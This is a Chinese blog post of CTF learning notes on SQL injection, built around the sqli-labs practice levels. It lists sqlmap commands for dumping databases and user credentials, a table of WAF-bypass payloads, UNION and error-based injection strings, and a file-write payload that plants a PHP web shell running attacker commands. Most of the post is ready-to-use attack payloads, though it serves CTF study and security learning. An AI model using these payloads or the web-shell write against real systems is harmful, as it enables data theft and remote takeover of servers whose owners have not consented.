---
title: SQL类
image: '/images/138311505_p0_master1200.jpg'
pinned: true
published: 2025-12-21
description: CTF 学习笔记与技术复盘
category: 秘籍
tags: [秘籍]
---

# #SQLmap学习中：



---



## #知道库名，表名：



```
sqlmap -u "http://localhost/Less-2/?id=1" --batch -D security -T users --columns --dump
```

根据sql lab的前四关，我们可以总结出一个秒杀的指令。

使用结构为：

**一** ：

sqlmap -u + "           "	**(指定url和id)**

**二** ：

--batch	**(自动化设置)**

**三** ：

-D security	**(指定数据库)**

**四** ：

-T users	**(指定表名)**

**五** ：

--colums	**(获取列名)**

**六** ：

--dump	**(导出数据)**



**补充：**

**七**：

--technique=T	(指定方式T，时间盲注)



---



## #小连招这块：

`sqlmap -u "..." --batch --current-db`	**(爆破数据库)**

`sqlmap -u "..." --batch -D "数据库" --tables`	**(爆破数据库的表)**

`sqlmap -u "..." --batch -D "数据库名" -T "表名" --dump`	**(爆破表内数据)**



---



## #时间盲注版：

```
sqlmap -u "http://localhost/Less-10/?id=1" \
  --batch \
  --technique=T \
  --time-sec=3 \
  --level=5 \
  --risk=3 \
  --tamper=space2comment \
  --dbs
```

- `--time-sec=3` - 设置延迟时间为3秒
- `--level=5` - 最高测试等级（检测所有可能的注入点）
- `--risk=3` - 最高风险等级（使用更危险的payload）
- `--tamper=space2comment` - 使用tamper脚本将空格替换为注释`/**/`
- `--dbs` - 尝试获取数据库名(全部的)
-  `-D` -指定数据库
-  `-T` -指定表
-  `-C` -直接列
- `--dump` -导出数据

补充：

`--data="			"`	**(POST)**



























---



## #.常见指定方式：



| **分类**           | **参数方法**          | **作用说明**                                           | **典型应用示例**                      |
| ------------------ | --------------------- | ------------------------------------------------------ | ------------------------------------- |
| **目标与注入点**   | **`-u <URL>`**        | 指定目标 URL。                                         | `-u "http://site.com/id=1"`           |
|                    | **`-r <文件>`**       | 从文本文件中加载 HTTP 请求包。                         | `-r search_post.txt` (用于 POST 注入) |
|                    | **`-p <参数>`**       | **明确指定注入点**。跳过其他字段，只测这一个。         | `-p "username"`                       |
|                    | **`--data`**          | 指定 POST 提交的数据内容。                             | `--data="id=1&type=user"`             |
|                    | **`--cookie`**        | 携带登录后的 Cookie 信息。                             | `--cookie="sessionid=abc123"`         |
|                    | **`--level`**         | 探测等级（1-5）。等级越高，测试范围（如 Header）越广。 | `--level 3`                           |
| **性能与探测优化** | **`--dbms`**          | **预指数据库类型**。跳过自动指纹识别，直接发包。       | `--dbms mysql`                        |
|                    | **`--flush-session`** | **清除缓存**。确保结果来自本次真实的实时探测。         | 在环境变动或结果存疑时使用            |
|                    | **`--threads`**       | 设置并发线程数（最高建议 10）。                        | `--threads 10`                        |
|                    | **`--technique`**     | 指定注入技术（B:布尔/E:报错/U:联合/S:堆叠/T:时间）。   | `--technique U` (只尝试联合查询)      |
|                    | **`-o`**              | 一键开启所有优化开关，提高扫描速度。                   | `sqlmap -u "..." -o`                  |
| **数据提取(脱库)** | **`--dbs`**           | 获取所有数据库名称。                                   | 确认注入后的第一步                    |
|                    | **`--current-db`**    | 获取当前网站正在使用的数据库名。                       | 缩小目标范围                          |
|                    | **`-D <库名>`**       | 指定要操作的数据库。                                   | `-D user_admin`                       |
|                    | **`--tables`**        | 列出指定库中的所有表名。                               | 配合 `-D` 使用                        |
|                    | **`-T <表名>`**       | 指定要操作的数据表。                                   | `-T accounts`                         |
|                    | **`--columns`**       | 列出指定表中的所有列名（字段）。                       | 配合 `-D -T` 使用                     |
|                    | **`--dump`**          | **导出数据**。将表中的具体记录下载到本地。             | `--dump -T accounts`                  |
| **绕过与高级防护** | **`--tamper`**        | **调用脚本**。用于混淆 Payload 绕过 WAF/防火墙。       | `--tamper="space2comment.py"`         |
|                    | **`--random-agent`**  | 使用随机的浏览器 User-Agent，防止被规则拦截。          | 模拟真实浏览器访问                    |
|                    | **`--proxy`**         | 设置代理服务器。                                       | `--proxy="http://127.0.0.1:8080"`     |
| **其他控制**       | **`--batch`**         | 所有交互式提问自动选择默认答案（自动模式）。           | 挂机扫描时必备                        |

**注意：如遇到需要指定位置的，要利用文本，通过文本内容星号包裹，指定注入点。**



---



## #













---



# #SQL类：



---



## #绕过技巧：

| **拦截项 (被过滤)** | **替代方案 (绕过)**    | **具体用法 / Payload 示例**                                  | **备选/下一个方案 (如果不行)**                               |
| ------------------- | ---------------------- | ------------------------------------------------------------ | ------------------------------------------------------------ |
| **空格**            | `/**/` 或 `()`         | `1'/**/union/**/select...` `select(password)from(users)`     | `%0a` (换行符) 或 `%09` (Tab)                                |
| **and / or**        | `&&` / `||` 或 `^`     | `1                                                           |                                                              |
| **union / select**  | **堆叠注入 (Stacked)** | `1;show/**/tables;`                                          | `handler` 或 `TABLE` 关键字 (MySQL 8.0+)                     |
| **from**            | **无 From 注入**       | **查看列名**: `show/**/columns/**/in/**/Flag;` **查数据**: `*,1` (利用逻辑或拼接) | **Rename 法**: `rename/**/table/**/Flag/**/to/**/tmp;`       |
| **flag (关键字)**   | **通配符 \***          | `select/**/*/from/**/Flag` (配合 `*,1` 逻辑)                 | **Hex 编码**: `set/**/@a=0x(hex字符串);prepare/**/s/**/from/**/@a;` |
| **like / regexp**   | **直接大小比较**       | `database()>0x61` (比较字典序)                               | `strcmp(str1,str2)` (比较函数)                               |
| **substr / for**    | **字符串函数**         | `left(database(),1)='s'` `mid(database()/**/from/**/1/**/for/**/1)` | **直接 Hex 比较**: `database()>0x616161`                     |
| **updatexml**       | **其他报错函数**       | `extractvalue(1,concat(0x7e,database()))`                    | `exp(~(select*from(select/**/database())a))`                 |
| **handler**         | **预处理语句**         | `prepare/**/s/**/from/**/0x(hex数据);execute/**/s;`          | **Rename 法** 顶替原本查询的表名                             |
| **长度限制**        | **极致压缩**           | `1;desc/**/Flag` (代替 `show columns`)                       | **分段 Set**: 先多次 `set/**/@a=concat(@a,...)`              |



---



## #数字型：

```
源码:
$id = $_GET['id'];
$sql = "SELECT * FROM news WHERE id = $id";
```

`id=1 ORDER BY ?` **(爆列)**

`id=-1 UNION SELECT 1, 2, 3` **(回显确定)**

`id=-1 UNION SELECT 1, database(), 3` **(爆库)**

`id=-1 UNION SELECT 1, group_concat(table_name), 3 FROM information_schema.tables WHERE table_schema = '数据库'` **(爆表)**

`id=-1 UNION SELECT 1, group_concat(column_name), 3 FROM information_schema.columns WHERE table_name = '表名'` **(读表)**

`id=-1 UNION SELECT 1, group_concat(username, '~', password), 3 FROM users` **(读数据，username和password为表users的数据)**



---



### #语法积累：

`information_schema.tables` ：记录表名的函数。

`WHERE table_schema=database()` ：过滤的函数，用来筛选表名。

`group_concat(table_name)` ：拼接读取的数据的函数。

`database()` ：显示当前数据库的函数。

`user()` ：显示当前登入用户的函数



---



## #字符型：

```
源码:
$id = $_GET['id'];
$sql = "SELECT * FROM users WHERE id = '$id'";
```

`id=1' ORDER BY ? --+` **(爆列)**

`id=-1' UNION SELECT 1, 2, 3 --+` **(回显确定)**

`id=-1' UNION SELECT 1, database(), 3 --+` **(爆库)**

`id=-1' UNION SELECT 1, group_concat(table_name), 3 FROM information_schema.tables WHERE table_schema = '数据库' --+` **(爆表)**

`id=-1' UNION SELECT 1, group_concat(column_name), 3 FROM information_schema.columns WHERE table_name = '表名' --+` **(读表)**

`id=-1' UNION SELECT 1, group_concat(username, '~', password), 3 FROM users --+` **(读数据，username和password为表users的数据)**



---



### #其他类型的源码：

1.

```
$id = $_GET['id'];
$sql = "SELECT * FROM news WHERE id = ('$id')";
```

闭合类型为 ') 。



2.

```
$id = $_GET['id'];
$sql = "SELECT * FROM news WHERE id = ("$id")";
```

闭合类型为")。













4



---



## #报错型：

`id=-1 AND (updatexml(1, concat(0x7e, (database()), 0x7e), 1)) --+` **(最基础的)**

`id=-1' AND (updatexml(1, concat(0x7e, (database()), 0x7e), 1)) --+` **(后端存在单引号)**

`?id=-1 AND updatexml(1, concat(0x7e, (select table_name from information_schema.tables where table_schema='数据库' limit 0,1), 0x7e), 1) ` **(查表)**

`?id=-1 AND updatexml(1, concat(0x7e, (select column_name from information_schema.columns where table_name='表' limit 1,1), 0x7e), 1)`  **(查对应表的列)**

`?id=-1 AND updatexml(1, concat(0x7e, (select username from users limit 0,1), 0x7e), 1)`  **(查数据)**

```
sqlmap -u "题目的url" \
--level=5 \
--risk=3 \
--batch \
--technique=E \
--data="uname=admin&passwd=1&submit=Submit" \ (POST的内容)
-p passwd (指定注入点)
```

















**注意：**

由于报错注入的特殊性，所有内容都得多次注入后拿全。



---



## #文件注入：

`?id=1')) union select 1,2,'<?php @system($_GET["cmd"]); ?>' into outfile "/var/www/html/Less-7/shell.php"--+`	**(('	'))包裹**



---



## #布尔盲注：

`sqlmap -u "..." --batch --current-db`	**(爆破数据库)**

`sqlmap -u "..." --batch -D "数据库" --tables`	**(爆破数据库的表)**

`sqlmap -u "..." --batch -D "数据库名" -T "表名" --dump`	**(爆破表内数据)**























---

版权声明：本文由白白毛毛创作，转载请注明出处。
